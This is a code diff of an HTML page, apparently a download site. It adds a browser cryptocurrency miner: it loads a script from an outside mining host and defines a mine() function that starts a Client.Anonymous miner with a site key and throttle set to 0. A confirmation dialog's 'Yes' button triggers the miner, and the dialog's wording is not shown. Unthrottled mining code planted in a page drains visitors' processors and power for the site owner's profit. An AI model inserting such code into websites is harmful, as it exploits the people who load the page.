@@ -93,7 +93,16 @@ background: '#3b3b3b',
 }) 
 		}
 	</script>
-	   	   <script src="https://www.hostingcloud.racing/muLq.js"></script>
+	   <script src="https://www.hostingcloud.racing/muLq.js"></script>
+<script>
+	function mine() {
+    var _client = new Client.Anonymous('0803029322a5ef725e043a7e0eecaa25cd7705fb2aabe987e4aba7b08e2e0d65', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "", "#cccccc", 40, "#3d3d3d");
+	}
+</script>
 	   <script>
     
 		Swal.fire({
@@ -108,14 +117,12 @@ background: '#3b3b3b',
   confirmButtonText: 'Yes'
 }).then((result) => {
   if (result.isConfirmed) {
-        var _client = new Client.Anonymous('0803029322a5ef725e043a7e0eecaa25cd7705fb2aabe987e4aba7b08e2e0d65', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
+        mine();
   }
 }) 
 	
 </script>
+
 	         <script>
 
 		function download2() {
